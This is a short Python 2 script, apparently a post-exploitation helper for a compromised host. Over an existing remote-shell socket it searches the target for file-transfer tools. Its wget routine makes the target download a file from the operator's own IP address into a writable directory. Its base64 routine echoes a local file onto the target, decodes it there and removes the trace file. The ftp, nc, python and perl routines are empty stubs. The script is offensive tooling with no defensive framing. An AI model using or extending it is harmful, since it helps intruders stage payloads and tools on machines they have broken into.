import time

transfer_tools = ['wget','ftp','nc','python','perl','base64']

def wget(s):
	local_ip = raw_input("> Local IP address: ")
	port = raw_input("> Port number: ")
	filename = raw_input("> Filename to get: ")
	writable_dir = raw_input("> Writable directory on target: ")
	output_file = raw_input("> Name of output file: ")
	cmd = "wget -O "+writable_dir+"/"+output_file + " http://%s:%s/%s\n" % (local_ip,port,filename)
	print cmd
	s.send(cmd)
	time.sleep(2)
	print "[+] File transfered (hopefully)"
	s.send("ls -al "+writable_dir+"\n")
	print s.recv(1024)

def ftp(s):
	print "ftp"

def nc(s):
	print "nc"

def python(s):
	print "python"

def perl(s):
	print "perl"

def base64(s):
	import base64
	file = raw_input("> Full path to local file: ")
	content = open(file, "rb")
	data = content.read()
	encoded = base64.b64encode(data)
	writable_dir = raw_input("> Full path to write to: ")
	output_file = raw_input("> Output file name: ")
	command = "echo "+encoded+" > " + writable_dir+"/conn64.txt\n"
	print command
	s.send(command)
	time.sleep(2)
	command = "base64 -d "+writable_dir+"/conn64.txt > "+writable_dir+"/"+output_file+"; rm "+writable_dir+"/conn64.txt\n" 
	print command
	s.send(command)

def main(s):
	usable = []
	for i in transfer_tools:
		print "[+] Checking for %s." % i
		s.send("find / -name " + i + " -type f\n")
		data = s.recv(1024)
		if i in data:
			usable.append(i)

	for i in usable:
		print "[+] %s is available." % i
	selection = raw_input("> What tool would you like to use?: ")
	globals()[selection](s)
